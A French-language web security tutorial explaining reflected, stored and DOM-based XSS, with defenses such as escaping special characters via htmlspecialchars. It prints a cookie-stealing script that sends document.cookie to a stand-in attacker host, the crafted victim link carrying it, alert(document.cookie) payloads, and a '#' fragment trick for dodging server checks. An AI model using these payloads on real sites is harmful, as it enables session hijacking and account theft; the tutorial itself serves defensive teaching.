<h4>Failles XSS</h4><p style="text-align: justify;">La faille de Cross Site Scripting est une faille qui permet d&rsquo;injecter du code HTML, CSS ou JavaScript dans des formulaires.</p><p style="text-align: justify;">Il existe 3 types de XSS&nbsp;:</p><ul><li>Le XSS r&eacute;fl&eacute;chi qui est non permanent.</li><li>Le XSS stock&eacute; qui lui est permanent.</li><li>Le XSS DOM qui consiste &agrave; modifier l&rsquo;environnement DOM du navigateur de la victime</li></ul><h4>XSS R&eacute;fl&eacute;chi</h4><p style="text-align: justify;">Cette faille est la plus courante et la plus simple &agrave; exploiter. Heureusement, il est tr&egrave;s facile de s&rsquo;en pr&eacute;munir.</p><p style="text-align: justify;">Tr&egrave;s peu de sites aujourd&rsquo;hui pr&eacute;sentent des failles XSS de type r&eacute;fl&eacute;chi car la plupart des technologies web bloquent ces failles.</p><p style="text-align: justify;">On l&rsquo;appelle non permanente car elle n&rsquo;est pas stock&eacute;e en base de donn&eacute;es ou dans un fichier, elle est donc &eacute;ph&eacute;m&egrave;re. Cette faille exploite le fait que l&rsquo;application Web affiche directement ce qu&rsquo;un utilisateur a saisi dans un champ de formulaire. Le navigateur ex&eacute;cute alors le code frauduleux g&eacute;n&eacute;r&eacute; dans la page de r&eacute;sultats.</p><p style="text-align: justify;">Voici un exemple tr&egrave;s classique, imaginez un site de e-commerce qui pr&eacute;sente une barre de recherche pour rechercher un produit particulier. Lorsqu&rsquo;un utilisateur utilise cette barre, l&rsquo;intitul&eacute; de la recherche est affich&eacute; sur la page des r&eacute;sultats. Ainsi si la page est vuln&eacute;rable aux attaques XSS, le code s&rsquo;ex&eacute;cutera et s&rsquo;affichera dans le navigateur de l&rsquo;utilisateur.</p><p style="text-align: justify;">Pour illustrer la faille, j&rsquo;ai cr&eacute;&eacute; une page URL vuln&eacute;rable aux failles XSS qui simule une barre de recherche. Si un utilisateur s&rsquo;amuse &agrave; taper&nbsp;la commande suivante dans la barre de recherche&nbsp;:</p><p align="center"><img src="/images/faille1.png" alt="coucou" style="width: 60%;" class="fr-fic fr-dii"><br><br></p><p style="text-align: justify;">Il verra s&rsquo;afficher la fen&ecirc;tre de dialogue JavaScript suivante&nbsp;:</p><p align="center"><img src="/images/faille2.png" alt="coucou" style="width: 80%;" class="fr-fic fr-dii"><br><br></p><p style="text-align: justify;">Cependant, les derni&egrave;res versions de Google Chrome d&eacute;tectent si du code HTML/Javascript a &eacute;t&eacute; modifi&eacute; directement par l&rsquo;utilisateur. Google Chrome bloque alors la page pour &eacute;viter l&rsquo;ex&eacute;cution de code malicieux et affiche la page suivante&nbsp;:</p><p align="center"><img src="/images/faille3.png" alt="coucou" style="width: 60%;" class="fr-fic fr-dii"><br><br></p><p style="text-align: justify;">Pour illustrer, voici comment un attaquant pourrait exploiter une faille XSS de type r&eacute;fl&eacute;chi dans le cas d&rsquo;un formulaire qui passe ses variables par l&rsquo;URL. Par exemple, pour le formulaire pr&eacute;c&eacute;dent, on obtiendrait&nbsp;:</p><p>http://site-vulnerable.com?recherche=ma+recherche</p><p><br></p><p style="text-align: justify;">L&rsquo;attaquant pourrait essayer de voler les cookies d&rsquo;un utilisateur. Pour cela, il peut utiliser ce script Javascript qui r&eacute;cup&egrave;re les cookies de session de l&rsquo;utilisateur.</p><p><code>&lt;script&gt;document.location.href=&quot;http://www.site-attaquant.com/recuperation_cookie.php?cookie=&#39;+document.cookie&rsquo;&quot;&lt;/script&gt;</code></p><p><br></p><p style="text-align: justify;">L&rsquo;attaquant fait passer ce script dans l&rsquo;URL du site vuln&eacute;rable et envoie le lien &agrave; la victime&nbsp;:</p><p><code>http://site-vulnerable.com?recherche=&lt;script&gt;document.location.href=&quot;http://www.site-attaquant.com/recuperation_cookie.php?cookie=&#39;+document.cookie&rsquo;&quot;&lt;/script&gt;</code></p><p><br></p><p style="text-align: justify;">Si la victime clique sur le lien, elle sera redirig&eacute;e vers le site de l&rsquo;attaquant qui lui volera ses cookies.
L&rsquo;attaquant poss&egrave;de maintenant les cookies de session de l&rsquo;utilisateur et peut les utiliser sur le site vuln&eacute;rable.</p><p style="text-align: justify;">Passons maintenant au deuxi&egrave;me type de faille XSS.</p><h4>le XSS stock&eacute;.</h4><p style="text-align: justify;">Cette faille est plus dangereuse que la pr&eacute;c&eacute;dente car n&rsquo;importe quel utilisateur qui visite le site vuln&eacute;rable peut &ecirc;tre touch&eacute;. En effet, le code frauduleux ins&eacute;r&eacute; par l&rsquo;attaquant reste stock&eacute; dans un fichier ou la base de donn&eacute;es du site vuln&eacute;rable.</p><p style="text-align: justify;">Par exemple, si les utilisateurs ont la possibilit&eacute; de laisser un message sur un site, ils peuvent ins&eacute;rer du code frauduleux si le site est vuln&eacute;rable aux faille XSS.</p><p style="text-align: justify;">Le principe reste le m&ecirc;me, l&rsquo;attaquant envoie un script qui redirige l&rsquo;utilisateur dans le but de r&eacute;cup&eacute;rer les cookies de la victime. La seule diff&eacute;rence est que l&rsquo;attaquant n&rsquo;a pas besoin d&rsquo;envoyer un lien &agrave; la victime, les utilisateurs se pi&egrave;gent tout seul en naviguant sur le site vuln&eacute;rable&nbsp;!</p><p style="text-align: justify;">Comment s&rsquo;en prot&eacute;ger&nbsp;?</p><p style="text-align: justify;">Il suffit de remplacer les six caract&egrave;res sp&eacute;ciaux suivant par leur code HTML&nbsp;: &amp;, &lt;, &gt;, &quot;&nbsp;, &lsquo;, /. Des fonctions existent d&eacute;j&agrave;, en php on utilisera htmlspecialchars.</p><p style="text-align: justify;">C&ocirc;t&eacute; client comme c&ocirc;t&eacute; serveur, il faut v&eacute;rifier que les donn&eacute;es re&ccedil;ues sont conformes &agrave; celles attendues et les rejeter si elles ne le sont pas.</p><h4>XSS DOM&nbsp;:</h4><p style="text-align: justify;">Avant d&rsquo;aborder cette faille, revenons sur la notion de DOM (Document Object Model). Ce mod&egrave;le permet de repr&eacute;senter une page HTML sous la forme d&rsquo;un arbre comme illustr&eacute; sur la figure ci-dessous.</p><p style="text-align: justify;">Le DOM est g&eacute;n&eacute;r&eacute; par le navigateur web. Il est principalement utilis&eacute; pour que les scripts Javascript puissent facilement acc&eacute;der et modifier le contenu d&rsquo;une page web.</p><p align="center"><img src="/images/faille4.png" alt="coucou" style="width: 40%;" class="fr-fic fr-dii"><br><br></p><p style="text-align: justify;">La faille XSS DOM consiste &agrave; injecter du code malicieux pour modifier le DOM de la page web. A la diff&eacute;rence des 2 failles pr&eacute;c&eacute;dentes (XSS stock&eacute;s et r&eacute;fl&eacute;chis), la faille XSS DOM est une faille qui introduit du code malicieux au niveau du client.</p><p style="text-align: justify;">C&rsquo;est le script Javascript ex&eacute;cut&eacute; sur le navigateur du client qui va modifier le DOM de la page web et provoquer un comportement non voulu (r&eacute;cup&eacute;ration de cookie par exemple).</p><p style="text-align: justify;">Pour les failles XSS stock&eacute;s et r&eacute;fl&eacute;chis, c&rsquo;est le serveur qui contre sa volont&eacute; produit une page web html avec du code malicieux gliss&eacute; dedans.</p><p style="text-align: justify;">Prenons un exemple bien document&eacute; par l&rsquo;OWASP&nbsp;:</p><p style="text-align: justify;">Imaginez une page html avec le formulaire suivant&nbsp;pour le choix de la langue favorite :</p><p><code>&nbsp;Select your language:<br><br>&nbsp;&lt;select&gt;&lt;script&gt;<br></code></p><p class="tabulation"><code>document.write(&quot;&lt;OPTION value=1&gt;&quot;+document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8)+&quot;&lt;/OPTION&gt;&quot;);</code></p><p><code>&nbsp;</code></p><p class="tabulation"><code>document.write(&quot;&lt;OPTION value=2&gt;English&lt;/OPTION&gt;&quot;);</code></p><p><code>&nbsp;&lt;script&gt;&lt;/select&gt;<br></code></p><p><br></p><p><br></p><p style="text-align: justify;">La page contenant ce formulaire est invoqu&eacute;e gr&acirc;ce &agrave; l&rsquo;URL suivante&nbsp;:</p><p><code>&nbsp;http://www.some.site/page.html?default=French<br><br></code></p><p style="text-align: justify;">o&ugrave; ici nous avons sp&eacute;cifi&eacute; que le langage pr&eacute;f&eacute;r&eacute; &eacute;tait le fran&ccedil;ais.</p><p style="text-align: justify;">Le DOM de la page web va &ecirc;tre g&eacute;n&eacute;r&eacute; et gr&acirc;ce au script, il y aura 2 options pour la langue favorite&nbsp;: fran&ccedil;ais et anglais.</p><p style="text-align: justify;">D&eacute;tournons maintenant l&rsquo;utilisation de ce script pour y introduire du code malicieux. En modifiant l&rsquo;URL pour acc&eacute;der &agrave; la page du formulaire de la fa&ccedil;on suivante, on pourra afficher les cookies de l&rsquo;utilisateur.</p><p><code>&nbsp;http://www.some.site/page.html?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><br></p><p style="text-align: justify;">Le navigateur de l&rsquo;utilisateur va alors g&eacute;n&eacute;rer l&rsquo;objet DOM et ins&eacute;rer dans le formulaire le code frauduleux qui va &ecirc;tre ex&eacute;cut&eacute; par le navigateur. Les cookies seront alors affich&eacute;s dans une fen&ecirc;tre pop-up. On peut maintenant imaginer un cas r&eacute;aliste o&ugrave; un attaquant ins&egrave;re un script qui r&eacute;cup&egrave;re les cookies de la victime et les envoie sur le serveur de l&rsquo;attaquant.</p><h5>Nota Bene&nbsp;:</h5><p style="text-align: justify;">Bien que le code malicieux ne soit pas trait&eacute; c&ocirc;t&eacute; serveur, il passe quand m&ecirc;me par le serveur au moment de la requ&ecirc;te HTTP pour r&eacute;cup&eacute;rer la page. Ainsi, des v&eacute;rifications c&ocirc;t&eacute; serveur pourraient &ecirc;tre effectu&eacute;es pour &eacute;chapper les caract&egrave;res sp&eacute;ciaux Javascript et ainsi emp&ecirc;cher l&rsquo;ex&eacute;cution du script.</p><p><code>http://www.some.site/page.html#default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><br></p><p style="text-align: justify;">Cependant, ces v&eacute;rifications c&ocirc;t&eacute; serveur peuvent &ecirc;tre d&eacute;tourn&eacute;es en utilisant le # dans l&rsquo;URL. Tout ce qui est apr&egrave;s le # dans une URL n&rsquo;est pas envoy&eacute; au serveur. Cependant, le navigateur du client interpr&eacute;tera tout de m&ecirc;me le script plac&eacute; derri&egrave;re le # et l&rsquo;attaque sera effective.</p>